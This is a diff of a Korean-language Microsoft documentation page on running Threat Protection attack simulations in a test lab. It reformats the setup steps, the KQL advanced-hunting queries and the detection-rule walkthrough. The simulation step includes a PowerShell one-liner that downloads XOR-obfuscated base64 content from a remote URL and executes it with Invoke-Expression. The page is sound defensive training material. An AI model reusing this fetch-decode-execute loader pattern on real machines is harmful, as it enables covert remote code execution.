@@ -17,14 +17,15 @@ manager: dansimp
 audience: ITPro
 ms.collection:
 - M365-security-compliance
-- m365solution-evalutatemtp
+- m365solution-scenario
+- m365solution-pilotmtpproject
 ms.topic: conceptual
-ms.openlocfilehash: e6cf01f5540e383fb56e387cd07b455741221dc5
-ms.sourcegitcommit: 9d8d071659e662c266b101377e24549963e43fef
+ms.openlocfilehash: f165a34d5e9df2f3502a9d9c6230fed9b73b758b
+ms.sourcegitcommit: a83acd5b9eeefd2e20e5bac916fe29d09fb53de9
 ms.translationtype: MT
 ms.contentlocale: ko-KR
-ms.lasthandoff: 10/06/2020
-ms.locfileid: "48368096"
+ms.lasthandoff: 10/10/2020
+ms.locfileid: "48418148"
 ---
 # <a name="run-your-microsoft-threat-protection-attack-simulations"></a>Microsoft Threat Protection 공격 시뮬레이션 실행  
 
@@ -92,21 +93,23 @@ ms.locfileid: "48368096"
 준비 단계가 진행 되는 동안 파일럿 환경을 이미 구성 했기 때문에이 시나리오에는 테스트 장치 및 도메인 컨트롤러의 두 장치가 있는지 확인 해야 합니다.
 
 1.  테 넌 트에서 [Microsoft Threat Microsoft Threat Protection을 사용 하도록 설정](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)했는지 확인 합니다.
+
 2.  테스트 도메인 컨트롤러 구성을 확인 합니다.
+
     - 장치는 Windows Server 2008 R2 이상 버전에서 실행 됩니다.
     - [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) 에 대 한 테스트 도메인 컨트롤러와 [원격 관리](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)를 사용 하도록 설정 합니다.    
     - [AZURE ATP 및 Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) 을 사용 하도록 설정 되었는지 확인 합니다.
     - 테스트 사용자가 도메인에 작성 됨-관리자 권한이 필요 하지 않습니다.
 
 3.  테스트 장치 구성 확인:
-    <br>
-    a.  장치는 Windows 10 버전 1903 이상 버전에서 실행 됩니다.
-    <br>
-    b.  테스트 장치가 테스트 도메인에 가입 되어 있습니다.
-    <br>
-    c.  [Windows Defender 바이러스 백신을 사용 하도록 설정](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)합니다. Windows Defender 바이러스 백신을 사용 하도록 설정 하는 데 문제가 있는 경우이 [문제 해결 항목](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)을 참조 하세요.
-    <br>
-    d.  테스트 장치가 [Microsoft Defender Advanced Threat Protection (MDATP)에 등록](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)확인 합니다.
+ 
+    1.  장치는 Windows 10 버전 1903 이상 버전에서 실행 됩니다.
+    
+    1.  테스트 장치가 테스트 도메인에 가입 되어 있습니다.
+    
+    1.  [Windows Defender 바이러스 백신을 사용 하도록 설정](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)합니다. Windows Defender 바이러스 백신을 사용 하도록 설정 하는 데 문제가 있는 경우이 [문제 해결 항목](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)을 참조 하세요.
+    
+    1.  테스트 장치가 [Microsoft Defender Advanced Threat Protection (MDATP)에 등록](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)확인 합니다.
 
 기존 테 넌 트를 사용 하 고 장치 그룹을 구현 하는 경우 테스트 장치에 대 한 전용 장치 그룹을 만들고 구성 UX에서 최상위 수준에 밀어넣습니다.
 
@@ -120,15 +123,17 @@ ms.locfileid: "48368096"
 2.  테스트 장치에서 Windows PowerShell 창을 엽니다.
 
 3.  다음 시뮬레이션 스크립트를 복사 합니다.
-```
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
-= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
--UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-```
->[!NOTE]
->웹 브라우저에서이 문서를 여는 경우 특정 문자를 잃지 않거나 추가 줄 바꿈을 도입 하지 않고 전체 텍스트를 복사 하는 데 문제가 있을 수 있습니다. 이 문서를 다운로드 하 여 Adobe Reader에서 엽니다.
+
+    ```powershell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
+    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
+    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+    
+    > [!NOTE]
+    > 웹 브라우저에서이 문서를 여는 경우 특정 문자를 잃지 않거나 추가 줄 바꿈을 도입 하지 않고 전체 텍스트를 복사 하는 데 문제가 있을 수 있습니다. 이 문서를 다운로드 하 여 Adobe Reader에서 엽니다.
 
 4. 프롬프트에서 복사한 스크립트를 붙여넣고 실행 합니다.
 
@@ -141,7 +146,7 @@ $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encodin
 
 이 스크립트가 완료 되 면 PowerShell 콘솔에 메시지가 표시 됩니다.
 
-```
+```console
 ran NetSessionEnum against [DC Name] with return code result 0      
 ```
 
@@ -333,96 +338,98 @@ Microsoft 365 보안 센터 포털의 인시던트로 다시 이동 합니다. *
 
 **이동 검색**
 1.  Security.microsoft.com 포털을 엽니다.
+
 2.  **사냥 > 고급 구하기**로 이동 합니다.
 
     ![M365 보안 센터 포털 탐색 모음의 고급 구하기 스크린샷](../../media/mtp/fig17.png) 
 
 3.  전자 메일 이벤트를 수집 하 여 시작 되는 쿼리를 작성 합니다.
-    a.  쿼리 창에서 새로 만들기를 선택 합니다.
-    b.  스키마에서 EmailEvents 테이블을 두 번 클릭 합니다.
 
-```
-EmailEvents 
-```                                        
+    1.  쿼리 창에서 새로 만들기를 선택 합니다.
+    
+    1.  스키마에서 EmailEvents 테이블을 두 번 클릭 합니다.
 
-   c.   시간 프레임을 지난 24 시간으로 변경 합니다. 위에서 시뮬레이션을 실행 했을 때 보낸 전자 메일이 지난 24 시간 이내에 있는 것으로 가정 하 고 그렇지 않으면 시간 프레임을 변경 합니다.
-   ![시간 프레임을 변경할 수 있는 위치에 대 한 스크린샷 시간 범위에서 선택 하려면 드롭다운 메뉴를 엽니다.](../../media/mtp/fig18.png) 
+        ```
+        EmailEvents 
+        ```                                        
 
+    1.  시간 프레임을 지난 24 시간으로 변경 합니다. 위에서 시뮬레이션을 실행 했을 때 보낸 전자 메일이 지난 24 시간 이내에 있는 것으로 가정 하 고 그렇지 않으면 시간 프레임을 변경 합니다.
+    
+        ![시간 프레임을 변경할 수 있는 위치에 대 한 스크린샷 시간 범위에서 선택 하려면 드롭다운 메뉴를 엽니다.](../../media/mtp/fig18.png) 
 
-   d.   쿼리를 실행 합니다.  파일럿 환경에 따라 결과가 여러 개 있을 수 있습니다.  
+    1.  쿼리를 실행 합니다.  파일럿 환경에 따라 결과가 여러 개 있을 수 있습니다.  
 
->[!NOTE]
->데이터 반환을 제한 하는 필터링 옵션은 다음 단계를 참조 하십시오.
+        > [!NOTE]
+        > 데이터 반환을 제한 하는 필터링 옵션은 다음 단계를 참조 하십시오.
 
-   ![고급 구하기 쿼리 결과 스크린샷](../../media/mtp/fig19.png) 
+        ![고급 구하기 쿼리 결과 스크린샷](../../media/mtp/fig19.png) 
 
->[!NOTE]
->고급 구하기 쿼리 결과를 테이블 형식 데이터로 표시 합니다. 차트와 같은 다른 형식 유형의 데이터를 볼 수도 있습니다.    
+        > [!NOTE]
+        > 고급 구하기 쿼리 결과를 테이블 형식 데이터로 표시 합니다. 차트와 같은 다른 형식 유형의 데이터를 볼 수도 있습니다.    
 
-   e.   결과를 확인 하 고 열었던 전자 메일을 식별할 수 있는지 확인 합니다.  메시지가 고급 구하기에 표시 되는 데 최대 2 시간이 걸릴 수 있습니다. 전자 메일 환경이 크고 결과가 많은 경우에는 **필터 표시 옵션** 을 사용 하 여 메시지를 찾을 수 있습니다. 
+    1.  결과를 확인 하 고 열었던 전자 메일을 식별할 수 있는지 확인 합니다.  메시지가 고급 구하기에 표시 되는 데 최대 2 시간이 걸릴 수 있습니다. 전자 메일 환경이 크고 결과가 많은 경우에는 **필터 표시 옵션** 을 사용 하 여 메시지를 찾을 수 있습니다. 
 
-   이 예제에서는 전자 메일이 Yahoo 계정에서 전송 되었습니다. **+** SenderFromDomain 섹션 아래의 **yahoo.com** 옆에 있는 아이콘을 클릭 한 다음 **적용** 을 클릭 하 여 선택한 도메인을 쿼리에 추가 합니다.  시뮬레이션을 실행 하 여 결과를 필터링 하는 1 단계에서 테스트 메시지를 보내는 데 사용 된 도메인 또는 전자 메일 계정을 사용 해야 합니다.  쿼리를 다시 실행 하 여 더 작은 결과 집합을 가져와 시뮬레이션에서 메시지가 표시 되는지 확인 합니다.
+        이 예제에서는 전자 메일이 Yahoo 계정에서 전송 되었습니다. **+** SenderFromDomain 섹션 아래의 **yahoo.com** 옆에 있는 아이콘을 클릭 한 다음 **적용** 을 클릭 하 여 선택한 도메인을 쿼리에 추가 합니다.  시뮬레이션을 실행 하 여 결과를 필터링 하는 1 단계에서 테스트 메시지를 보내는 데 사용 된 도메인 또는 전자 메일 계정을 사용 해야 합니다.  쿼리를 다시 실행 하 여 더 작은 결과 집합을 가져와 시뮬레이션에서 메시지가 표시 되는지 확인 합니다.
    
-   ![필터의 스크린샷 필터를 사용 하 여 검색 범위를 좁혀 원하는 속도를 빠르게 찾을 수 있습니다.](../../media/mtp/fig20.png) 
+        ![필터의 스크린샷 필터를 사용 하 여 검색 범위를 좁혀 원하는 속도를 빠르게 찾을 수 있습니다.](../../media/mtp/fig20.png) 
 
+        ```console
+        EmailEvents 
+        | where SenderMailFromDomain == "yahoo.com"
+        ```
 
-```
-EmailEvents 
-| where SenderMailFromDomain == "yahoo.com"
-```
-
-   f.   쿼리 결과 행을 클릭 하 여 레코드를 검사할 수 있습니다.
-   ![고급 검색 결과를 선택한 경우 열리는 녹음/녹화 옆 패널 검사 스크린샷](../../media/mtp/fig21.png) 
-
+    1.  쿼리 결과 행을 클릭 하 여 레코드를 검사할 수 있습니다.
+   
+        ![고급 검색 결과를 선택한 경우 열리는 녹음/녹화 옆 패널 검사 스크린샷](../../media/mtp/fig21.png) 
 
 4.  전자 메일을 볼 수 있음을 확인 했으므로 이제 첨부 파일에 대 한 필터를 추가 합니다. 환경에 첨부 파일이 있는 모든 전자 메일에 포커스를 맞춥니다. 이 시나리오에서는 사용자 환경에서 전송 되는 것이 아니라 인바운드 전자 메일에 집중 합니다. 추가한 필터를 제거 하 여 메시지를 찾고 "| 여기에서 **AttachmentCount > 0** 및 **emaildirection**  ==  **"인바운드" "**
 
-다음 쿼리는 모든 전자 메일 이벤트에 대 한 초기 쿼리 보다 더 짧은 목록의 결과를 보여 줍니다.
+    다음 쿼리는 모든 전자 메일 이벤트에 대 한 초기 쿼리 보다 더 짧은 목록의 결과를 보여 줍니다.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
 
-```
+    ```
 
 5.  다음으로, 첨부 파일에 대 한 정보 (예: 이름, 해시)를 결과 집합에 포함 합니다. 이렇게 하려면 **EmailAttachmentInfo** 테이블을 조인 합니다. 조인에 사용 하는 일반 필드는 **Networkmessageid** 및 **RecipientObjectId**입니다.
 
-다음 쿼리에는 추가 줄 "|"도 포함 되어 있습니다. **project-Rename EmailTimestamp = Timestamp**"다음 단계에서 추가할 파일 작업과 관련 된 해당 전자 메일 및 타임 스탬프와 관련 된 타임 스탬프를 식별 하는 데 도움이 되는 정보입니다.
+    다음 쿼리에는 추가 줄 "|"도 포함 되어 있습니다. **project-Rename EmailTimestamp = Timestamp**"다음 단계에서 추가할 파일 작업과 관련 된 해당 전자 메일 및 타임 스탬프와 관련 된 타임 스탬프를 식별 하는 데 도움이 되는 정보입니다.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    ```
 
 6.  다음으로, **EmailAttachmentInfo** 테이블의 **SHA256** 값을 사용 하 여 해당 해시에 대 한 **devicefileevents** (끝점에서 발생 한 파일 작업)를 찾습니다.  여기에는 일반 필드가 첨부 파일의 SHA256 해시가 됩니다.
 
-결과 테이블에는 이제 끝점 (Microsoft Defender ATP), 장치 이름, 수행 된 작업 (이 경우에는 FileCreated 이벤트만 포함 하도록 필터링 됨), 그리고 파일을 저장 한 위치 등의 세부 정보가 포함 됩니다. 프로세스와 연결 된 계정 이름도 포함 됩니다.
+    결과 테이블에는 이제 끝점 (Microsoft Defender ATP), 장치 이름, 수행 된 작업 (이 경우에는 FileCreated 이벤트만 포함 하도록 필터링 됨), 그리고 파일을 저장 한 위치 등의 세부 정보가 포함 됩니다. 프로세스와 연결 된 계정 이름도 포함 됩니다.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    ```
 
-이제 사용자가 첨부 파일을 열거나 저장 한 모든 인바운드 전자 메일을 식별 하는 쿼리를 만들었습니다. 또한이 쿼리를 구체화 하 여 특정 보낸 사람 도메인, 파일 크기, 파일 형식 등을 필터링 할 수 있습니다.
+    이제 사용자가 첨부 파일을 열거나 저장 한 모든 인바운드 전자 메일을 식별 하는 쿼리를 만들었습니다. 또한이 쿼리를 구체화 하 여 특정 보낸 사람 도메인, 파일 크기, 파일 형식 등을 필터링 할 수 있습니다.
 
 7.  기능은 전파, 서명자 및 발급자 정보와 같은 파일에 대 한 추가 TI 데이터를 가져올 수 있는 특별 한 유형의 조인입니다.  파일에 대 한 자세한 내용을 보려면 **Fileprofile ()** 함수 향상을 사용 하십시오.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-| distinct SHA1
-| invoke FileProfile()
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    | distinct SHA1
+    | invoke FileProfile()
+    ```
 
 
 **검색 만들기**
@@ -435,15 +442,15 @@ EmailEvents
     
     ![고급 구하기 페이지에서 검색 규칙 만들기를 클릭할 수 있는 위치 스크린샷](../../media/mtp/fig22.png) 
 
->[!NOTE]
->**검색 규칙 만들기** 를 클릭 하는 경우 쿼리에 구문 오류가 있으면 검색 규칙이 저장 되지 않습니다. 쿼리를 두 번 검사 하 여 오류가 없는지 확인 합니다. 
+    > [!NOTE]
+    > **검색 규칙 만들기** 를 클릭 하는 경우 쿼리에 구문 오류가 있으면 검색 규칙이 저장 되지 않습니다. 쿼리를 두 번 검사 하 여 오류가 없는지 확인 합니다. 
 
 
 2.  보안 팀이 경고를 이해 하 고, 생성 된 이유 및 수행할 것으로 예상 되는 작업을 확인할 수 있도록 하는 정보로 필수 필드를 채웁니다. 
 
     ![알림 세부 정보를 정의할 수 있는 만들기 검색 규칙 페이지의 스크린샷](../../media/mtp/fig23.png)
 
-필드를 명확 하 게 채워 다음 사용자에 게이 검색 규칙에 대 한 의사 결정을 내리는 데 도움을 주어 야 합니다. 
+    필드를 명확 하 게 채워 다음 사용자에 게이 검색 규칙에 대 한 의사 결정을 내리는 데 도움을 주어 야 합니다. 
 
 3.  이 경고의 영향을 받는 엔터티를 선택 합니다. 이 경우에는 **장치** 및 **사서함**을 선택 합니다.
 
@@ -458,7 +465,7 @@ EmailEvents
 
     ![알림 규칙의 범위를 설정할 수 있는 만들기 검색 규칙 페이지의 스크린샷에 따라 표시 되는 결과에 대 한 기대치가 관리 됩니다.](../../media/mtp/fig26.png) 
 
-이 파일럿에서이 규칙을 프로덕션 환경의 테스트 장치 하위 집합으로 제한할 수 있습니다.
+    이 파일럿에서이 규칙을 프로덕션 환경의 테스트 장치 하위 집합으로 제한할 수 있습니다.
 
 6.  **만들기**를 선택합니다. 그런 다음 탐색 패널에서 **사용자 지정 검색 규칙** 을 선택 합니다.
  
@@ -466,9 +473,9 @@ EmailEvents
 
     ![규칙 및 실행 세부 정보를 표시 하는 검색 규칙 페이지 스크린샷](../../media/mtp/fig27b.png) 
 
-이 페이지에서 세부 정보 페이지를 여는 검색 규칙을 선택할 수 있습니다. 
+    이 페이지에서 세부 정보 페이지를 여는 검색 규칙을 선택할 수 있습니다. 
 
-![규칙 실행 상태, 트리거된 경고 및 작업, 검색 편집 등을 볼 수 있는 전자 메일 첨부 파일 페이지 스크린샷](../../media/mtp/fig28.png) 
+    ![규칙 실행 상태, 트리거된 경고 및 작업, 검색 편집 등을 볼 수 있는 전자 메일 첨부 파일 페이지 스크린샷](../../media/mtp/fig28.png) 
 
 ### <a name="additional-advanced-hunting-walk-through-exercises"></a>추가 고급 구하기 단계별 연습
 
@@ -477,7 +484,7 @@ EmailEvents
 >[!NOTE]
 >파일럿 테스트 랩 환경에서 구하기 쿼리를 실행 하려면 자체 GitHub 계정을 사용 하 여 준비 해야 합니다.  
 
-| **제목** | **설명** | **MP4 다운로드** | **YouTube에서 보기** | **사용할 CSL 파일** |
+|  제목  |  설명  |  MP4 다운로드  |  YouTube에서 보기  |  사용할 CSL 파일  |
 |:-----|:-----|:-----|:-----|:-----|
 | 에피소드 1: KQL 기본 | Microsoft Threat Protection의 고급 구하기 기능에 대 한 기본 사항을 다루겠습니다. 사용 가능한 고급 구하기 데이터 및 기본 KQL 구문 및 연산자에 대해 알아봅니다. | [ MP4](https://aka.ms/MTP15JUL20_MP4) | [YouTube](https://youtu.be/0D9TkGjeJwM) | [에피소드 1: Git의 CSL 파일](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
 | 에피소드 2: 조인 | 계속 해 서 고급 사냥의 데이터에 대해 배우고 테이블을 함께 조인 하는 방법을 알아봅니다. 내부, 외부, 고유 및 세미 조인 및 기본 Kusto innerunique join의 nuances에 대해 알아봅니다. | [MP4](https://aka.ms/MTP22JUL20_MP4) | [YouTube](https://youtu.be/LMrO6K5TWOU) | [에피소드 2: Git의 CSL 파일](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
